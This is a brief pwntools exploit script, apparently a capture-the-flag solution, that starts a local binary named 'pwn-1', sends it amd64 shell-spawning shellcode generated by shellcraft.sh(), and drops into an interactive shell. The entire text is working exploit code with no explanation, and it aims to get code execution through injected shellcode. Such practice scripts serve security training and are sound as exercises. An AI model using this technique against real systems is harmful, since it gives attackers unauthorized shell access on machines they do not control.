from pwn import *
context.arch = 'amd64'
r=process('./pwn-1')
shellcode=asm(shellcraft.sh())
r.sendline(shellcode)
r.interactive()